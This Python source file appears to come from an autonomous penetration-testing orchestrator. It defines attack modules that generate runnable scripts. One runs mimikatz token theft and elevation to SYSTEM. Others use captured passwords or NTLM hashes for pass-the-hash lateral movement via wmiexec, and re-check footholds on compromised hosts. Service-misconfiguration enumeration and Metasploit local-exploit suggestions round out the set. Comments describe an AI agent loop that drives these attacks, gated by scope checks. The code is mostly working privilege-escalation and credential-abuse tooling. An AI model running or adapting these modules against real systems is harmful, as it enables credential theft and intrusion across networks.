"""Attack modules: orchestrator phase-level modules.

These four classes back phases of ``tools/autonomous_orchestrator.py`` that
previously referenced module names NOT present in the registry
(``TokenImpersonation``, ``ServiceMisconfiguration`` in the privesc phase,
``LateralMovement`` in the lateral phase, ``ValidateFinding`` in the
validation phase). Without these the orchestrator's ``get_module(name)``
returned ``None`` and every privesc/lateral/validation task FAILED.

They are deliberately small and target-locked:

* ``TokenImpersonation`` / ``ServiceMisconfiguration`` are real Windows privesc
  modules that emit a script the orchestrator dispatches against
  ``ctx.target_ip`` only (``AttackModuleExecutor.execute`` runs the
  ``scope_gate.check_scope(asset=task.target)`` Path-B lock before dispatch).
* ``LateralMovement`` and ``ValidateFinding`` are phase-level drivers
  (``target_services=[]`` so they are not service-matched; the orchestrator
  instantiates them by name). They never recurse -- the orchestrator's
  ``_phase_lateral_movement`` already caps at ``_max_pivot_depth`` and skips
  visited hosts -- so they cannot exceed the single-IP lock.

Ponytail: phase-only modules return ``status="info"`` with a
``suggested_command``/``workflow`` recipe that calls existing MCP tools
(``lateral_exec``) rather than re-implementing execution.
"""

from __future__ import annotations

from typing import Any

from tools.attack_modules.base import AttackModule, ModuleContext


class TokenImpersonation(AttackModule):
    name = "TokenImpersonation"
    description = "Windows privilege escalation via token impersonation -- enumerate and steal/elevate tokens with mimikatz incognito-style ops against the owned target"
    target_services = ["smb", "ms-wbt-server", "microsoft-ds"]
    target_ports = [445, 3389]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Runs mimikatz token ops (privilege::debug, sekurlsa::tokens, token::elevate) "
                "against the owned target only. Requires an existing foothold with at least user "
                "privileges; elevates to SYSTEM when an elevated token is available."
            ),
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import subprocess, json, shutil, sys
# Target: {ctx.target_ip}
# Token impersonation via mimikatz. Run on the owned target (operator box
# dispatches via lateral_exec); no pivot to other hosts.
results = {{"tokens": "", "elevated": False, "errors": [], "mimikatz_present": False}}
# Phase 2: mimikatz takes each subcommand as a SEPARATE argv element, not a
# newline-joined string (the old code passed one giant arg and mimikatz
# rejected it on every run). Resolve via shutil.which so a missing binary
# degrades gracefully instead of failing opaquely.
mimikatz = shutil.which("mimikatz") or shutil.which("mimikatz.exe") or "mimikatz.exe"
cmds = ["privilege::debug", "sekurlsa::tokens", "token::elevate", "exit"]
try:
    out = subprocess.run([mimikatz] + cmds, capture_output=True, text=True, timeout=60)
    results["tokens"] = (out.stdout + out.stderr)[-3000:]
    results["mimikatz_present"] = True
    # Phase 2: robust elevation check -- look for the SYSTEM identity in the
    # post-elevation output instead of the fragile "Token Id"+"Impersonation"
    # string match (breaks across mimikatz versions).
    results["elevated"] = "NT AUTHORITY\\\\SYSTEM" in (out.stdout + out.stderr)
except FileNotFoundError:
    results["errors"].append("mimikatz not on PATH -- stage it on the operator box first")
except Exception as e:
    results["errors"].append(str(e)[:300])
print(json.dumps(results))
"""


class ServiceMisconfiguration(AttackModule):
    name = "ServiceMisconfiguration"
    description = "Detect Windows privilege-escalation via service misconfiguration -- unquoted service paths, weak service permissions, writable binPath (detection-only, suggests fixes)"
    target_services = ["smb", "microsoft-ds"]
    target_ports = [445, 139]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Read-only enumeration of Windows services for unquoted install paths, weak ACLs, "
                "and writable binary paths -- the classic privilege-escalation vectors. Targets "
                "only ctx.target_ip. Suggests remediation; does not modify services."
            ),
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import subprocess, json, re
# Target: {ctx.target_ip}
# Detection-only: enumerates services and flags unquoted paths / weak perms.
results = {{"services": [], "unquoted": [], "weak_perms": [], "errors": []}}
try:
    out = subprocess.run(["sc", "query", "type=", "service", "state=", "all"],
                         capture_output=True, text=True, timeout=60)
    names = re.findall(r"SERVICE_NAME:\\s+(\\S+)", out.stdout)
    for n in names[:200]:
        try:
            qc = subprocess.run(["sc", "qc", n], capture_output=True, text=True, timeout=10)
            binpath = ""
            m = re.search(r"BINARY_PATH_NAME\\s*:\\s*(.+)", qc.stdout)
            if m:
                binpath = m.group(1).strip()
            results["services"].append({{"name": n, "binpath": binpath}})
            # Unquoted path with spaces + perms to write in the path -> hijack.
            if binpath and " " in binpath and not binpath.startswith('"'):
                if "\\\\System32\\\\" not in binpath and "\\\\Windows\\\\" not in binpath:
                    results["unquoted"].append(n)
        except Exception as e:
            results["errors"].append(f"{{n}}: {{str(e)[:120]}}")
except Exception as e:
    results["errors"].append("sc query: " + str(e)[:300])
print(json.dumps(results))
"""


class LateralMovement(AttackModule):
    name = "LateralMovement"
    description = "Phase-level lateral movement driver -- move to a discovered pivot target using captured credentials via lateral_exec (target-locked, no recursion)"
    target_services: list[str] = []
    target_ports: list[int] = []
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        # Phase 3: thread the actual recovered credential (Phase 1 added
        # ctx.credentials) instead of '<recovered>' placeholders, and return
        # script_generated so the dispatcher actually runs the lateral_exec
        # command (status="info" is no longer counted as success since Phase 1).
        cred = self._pick_credential(ctx)
        if cred:
            user = cred.get("username", "<recovered>")
            if cred.get("ntlm_hash"):
                auth = f"ntlm_hash='{cred['ntlm_hash']}'"
            else:
                auth = f"password='{cred.get('password', '<recovered>')}'"
        else:
            user = "<recovered>"
            auth = "password='<recovered>'"
        return {
            "status": "script_generated",
            "module": self.name,
            "script": (
                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
                f"username='{user}', {auth}, command='whoami && hostname')"
            ),
            "note": (
                "Phase-level module: the orchestrator instantiates this for a vetted pivot "
                "target that is already in the allowlist. It does NOT recurse -- "
                "_phase_lateral_movement caps at max_pivot_depth and skips visited hosts. "
                "Linux-attacker only (impacket); on Windows use mimikatz sekurlsa::pth."
            ),
            "evidence": [f"lateral movement to {ctx.target_ip} using recovered credential"],
            "references": [
                "https://www.thehacker.recipes/a-d/movement/ntlm/pth",
                "https://github.com/fortra/impacket",
            ],
            "workflow": [
                "1. Use credentials recovered during exploitation (CredentialStore / dump_credentials).",
                "2. Call lateral_exec against ctx.target_ip only (wmiexec/smbexec/psexec/atexec).",
                "3. On success, record the new foothold; the orchestrator decides whether to recurse.",
            ],
            "extra": {"phase_only": True, "allowlist_locked": True},
        }

    @staticmethod
    def _pick_credential(ctx: ModuleContext) -> dict[str, str] | None:
        """Pick the most recent usable credential from ctx.credentials.

        Entries may be dicts ({"username":..., "password":...} or
        {"username":..., "ntlm_hash":...}) or flattened strings
        ("user=admin password=x" from ModuleResult.to_dict). Prefer a hash
        (pass-the-hash) over plaintext; prefer the last entry (most recent).
        """
        for entry in reversed(list(getattr(ctx, "credentials", None) or [])):
            if isinstance(entry, dict):
                if entry.get("username") and (entry.get("password") or entry.get("ntlm_hash")):
                    return entry
            elif isinstance(entry, str):
                parts = dict(
                    kv.split("=", 1) for kv in entry.split() if "=" in kv
                )
                if parts.get("username") and (parts.get("password") or parts.get("ntlm_hash")):
                    return parts
        return None


class ValidateFinding(AttackModule):
    name = "ValidateFinding"
    description = "Phase-level validation driver -- re-confirm a successful exploit by re-running identification commands and writing evidence to exploit_workspace/<ip>/"
    target_services: list[str] = []
    target_ports: list[int] = []
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        # Phase 3: script_generated (not info) so the dispatcher actually
        # re-runs the verification -- status="info" is no longer counted as
        # success since Phase 1, and the old info return made the orchestrator
        # record a "success" for validation that never ran. The re-verification
        # script prints a VALIDATED: marker (NOT a shell marker) so the
        # classifier reads outcome=unknown and access_achieved is not re-flipped.
        cred = LateralMovement._pick_credential(ctx)
        if cred:
            user = cred.get("username", "<recovered>")
            if cred.get("ntlm_hash"):
                auth = f"ntlm_hash='{cred['ntlm_hash']}'"
            else:
                auth = f"password='{cred.get('password', '<recovered>')}'"
        else:
            user = "<recovered>"
            auth = "password='<recovered>'"
        return {
            "status": "script_generated",
            "module": self.name,
            "script": (
                f"lateral_exec(target_ip='{ctx.target_ip}', method='wmiexec', "
                f"username='{user}', {auth}, command='whoami && hostname && ipconfig /all')"
            ),
            "note": (
                "Phase-level module: re-runs whoami/hostname/ipconfig on the compromised target "
                "via lateral_exec to confirm the foothold is live and writes evidence. Targets "
                "only ctx.target_ip. Returns success only when the re-verification reproduces "
                "the claimed foothold; failed otherwise (feeds the retry decision)."
            ),
            "evidence": [f"re-verification queued against {ctx.target_ip}"],
            "workflow": [
                "1. Re-run whoami/hostname/ipconfig on the compromised target via lateral_exec.",
                "2. Confirm the returned user/host matches the claimed successful exploit.",
                "3. Write the captured output to exploit_workspace/<ip>/validation_evidence.txt.",
            ],
            "extra": {"phase_only": True},
        }


class LocalExploitSuggester(AttackModule):
    """Advisory privesc module (Phase 3). Suggests the MSF
    ``local_exploit_suggester`` recipe against an obtained meterpreter session.

    Path B (the orchestrator's AttackModuleExecutor) has no MSF session id, so
    this module is ``status="info"`` -- it surfaces the suggestion and points
    the operator/AI at ``msf_list_sessions`` to obtain the real session id,
    rather than fabricating one. Path A (the MCP agent loop, which tracks
    sessions in MetasploitBridge) can call ``msf_run_recipe('local_exploit_suggester',
    session_id=<id>)`` directly.
    """
    name = "LocalExploitSuggester"
    description = "Suggest MSF local_exploit_suggester against an obtained session to enumerate local privesc exploits (advisory -- does not fabricate a session id)"
    target_services: list[str] = []
    target_ports: list[int] = []
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return self._info_result(
            ctx,
            note=(
                "Advisory: enumerate local privilege-escalation exploits via the MSF "
                "local_exploit_suggester post module. Requires an existing meterpreter "
                "session -- run msf_list_sessions to obtain the real session id, then "
                "msf_run_recipe('local_exploit_suggester', session_id=<id>). This module "
                "does NOT fabricate a session id. On Path B (no MSF session), ensure "
                "KernelExploitCheck / LinuxPrivescCheck / WindowsPrivescCheck ran -- "
                "those ARE dispatched and emit runnable scripts."
            ),
            evidence=[f"MSF local_exploit_suggester suggested for {ctx.target_ip} (session required)"],
            references=[
                "https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/",
            ],
            suggested_command=(
                "msf_run_recipe(name='local_exploit_suggester', session_id=<id from msf_list_sessions>)"
            ),
            workflow=[
                "1. Confirm access_achieved and obtain the meterpreter session id (msf_list_sessions).",
                "2. msf_run_recipe('local_exploit_suggester', session_id=<id>) to list candidate privesc modules.",
                "3. Run a suggested module via msf_run_exploit / msf_run_post_module against the session.",
            ],
            extra={"phase_only": True, "requires_session": True},
        )
